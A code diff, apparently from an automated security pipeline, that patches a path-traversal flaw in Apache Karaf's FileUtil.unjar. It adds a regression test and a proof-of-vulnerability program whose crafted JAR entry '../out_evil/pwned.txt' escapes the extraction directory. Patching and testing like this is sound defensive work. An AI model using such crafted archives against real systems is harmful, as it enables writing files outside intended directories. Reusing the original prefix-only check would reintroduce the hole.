@@ -1,0 +1,150 @@
+diff --git a/obr/src/main/java/org/apache/karaf/obr/command/util/FileUtil.java b/obr/src/main/java/org/apache/karaf/obr/command/util/FileUtil.java
+index 7725d58..13562ce 100644
+--- a/obr/src/main/java/org/apache/karaf/obr/command/util/FileUtil.java
++++ b/obr/src/main/java/org/apache/karaf/obr/command/util/FileUtil.java
+@@ -110,7 +110,10 @@ public class FileUtil
+             }
+ 
+             File target = new File(dir, je.getName());
+-            if (!target.getCanonicalPath().startsWith(dir.getCanonicalPath())) {
++            String canonicalDir = dir.getCanonicalPath();
++            String canonicalTarget = target.getCanonicalPath();
++            if (!canonicalTarget.equals(canonicalDir)
++                && !canonicalTarget.startsWith(canonicalDir + File.separator)) {
+                 throw new IOException("JAR resource cannot contain paths with .. characters");
+             }
+ 
+diff --git a/obr/src/test/java/org/apache/karaf/obr/command/util/FileUtilTest.java b/obr/src/test/java/org/apache/karaf/obr/command/util/FileUtilTest.java
+index 71ee7cb..3b90147 100644
+--- a/obr/src/test/java/org/apache/karaf/obr/command/util/FileUtilTest.java
++++ b/obr/src/test/java/org/apache/karaf/obr/command/util/FileUtilTest.java
+@@ -76,4 +76,38 @@ public class FileUtilTest {
+         badKarFile.delete();
+     }
+ 
++    @Test
++    public void siblingPrefixEscapeTest() throws Exception {
++        File base = new File("target/test");
++        base.mkdirs();
++        // Sibling directory sharing the canonical-path string prefix of base.
++        File siblingEscape = new File("target/test_evil/pwned.txt");
++        siblingEscape.delete();
++
++        File badKarFile = new File(base, "sibling.kar");
++        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(badKarFile));
++        ZipEntry entry = new ZipEntry("../test_evil/pwned.txt");
++        zos.putNextEntry(entry);
++
++        byte[] data = "Test Data".getBytes();
++        zos.write(data, 0, data.length);
++        zos.closeEntry();
++        zos.close();
++
++        JarInputStream jis = new JarInputStream(new FileInputStream(badKarFile));
++        try {
++            FileUtil.unjar(jis, base);
++            fail("Failure expected on extracting a jar escaping to a sibling directory");
++        } catch (Exception ex) {
++            // expected
++        }
++
++        if (siblingEscape.exists()) {
++            siblingEscape.delete();
++            fail("JAR entry escaped the extraction directory into a sibling directory");
++        }
++
++        badKarFile.delete();
++    }
++
+ }
+diff --git a/.security-pipeline/pov/PovPathTraversal.java b/.security-pipeline/pov/PovPathTraversal.java
+new file mode 100644
+index 0000000..1debbfa
+--- /dev/null
++++ b/.security-pipeline/pov/PovPathTraversal.java
+@@ -0,0 +1,85 @@
++/*
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in
++ * org.apache.karaf.obr.command.util.FileUtil.unjar / copy.
++ *
++ * The containment guard in FileUtil.unjar is:
++ *     if (!target.getCanonicalPath().startsWith(dir.getCanonicalPath())) { ... }
++ * It omits the trailing File.separator, so a JAR entry that canonicalizes into a
++ * SIBLING directory sharing the same string prefix (e.g. dir="<base>/out",
++ * target="<base>/out_evil/...") passes the startsWith() check and is written
++ * OUTSIDE the intended extraction directory.
++ *
++ * This POV invokes the real project method FileUtil.unjar(JarInputStream, File)
++ * with a crafted archive and verifies that a file escapes the target directory.
++ *
++ * Exit 0  => vulnerable (escape file written outside the extraction dir)
++ * Exit 1  => not vulnerable (extraction contained / entry rejected)
++ */
++import org.apache.karaf.obr.command.util.FileUtil;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.File;
++import java.util.jar.JarEntry;
++import java.util.jar.JarInputStream;
++import java.util.jar.JarOutputStream;
++
++public class PovPathTraversal {
++
++    public static void main(String[] args) throws Exception {
++        // Base sandbox directory.
++        File base = File.createTempFile("obr-pov", "");
++        base.delete();
++        base.mkdirs();
++
++        // The legitimate extraction target directory.
++        File dir = new File(base, "out");
++        dir.mkdirs();
++
++        // Malicious entry name: canonicalizes to <base>/out_evil/pwned.txt,
++        // a sibling of <base>/out. It escapes "dir" but still string-prefix
++        // matches dir.getCanonicalPath() == "<base>/out".
++        String maliciousEntry = "../out_evil/pwned.txt";
++
++        // Build a JAR (no manifest) containing only the malicious entry.
++        ByteArrayOutputStream jarBytes = new ByteArrayOutputStream();
++        try (JarOutputStream jos = new JarOutputStream(jarBytes)) {
++            JarEntry je = new JarEntry(maliciousEntry);
++            jos.putNextEntry(je);
++            jos.write("PWNED-BY-PATH-TRAVERSAL\n".getBytes("UTF-8"));
++            jos.closeEntry();
++        }
++
++        // The file we expect to be written if the traversal succeeds.
++        File escapeFile = new File(base, "out_evil/pwned.txt");
++
++        // Drive the real project code.
++        boolean rejected = false;
++        try (JarInputStream jis =
++                 new JarInputStream(new ByteArrayInputStream(jarBytes.toByteArray()))) {
++            FileUtil.unjar(jis, dir);
++        } catch (Exception ex) {
++            // A correct patch throws IOException rejecting the traversing entry.
++            rejected = true;
++            System.out.println("unjar rejected the entry: " + ex);
++        }
++
++        boolean escaped =
++            escapeFile.exists()
++            && !escapeFile.getCanonicalPath().startsWith(
++                    dir.getCanonicalPath() + File.separator);
++
++        System.out.println("extraction dir : " + dir.getCanonicalPath());
++        System.out.println("escape file    : " + escapeFile.getCanonicalPath());
++        System.out.println("escape written : " + escapeFile.exists());
++        System.out.println("outside dir    : " + escaped);
++
++        if (escaped && !rejected) {
++            System.out.println("VULNERABLE: JAR entry escaped the extraction directory (CWE-022).");
++            System.exit(0);
++        }
++
++        System.out.println("NOT VULNERABLE: traversal was contained/rejected.");
++        System.exit(1);
++    }
++}
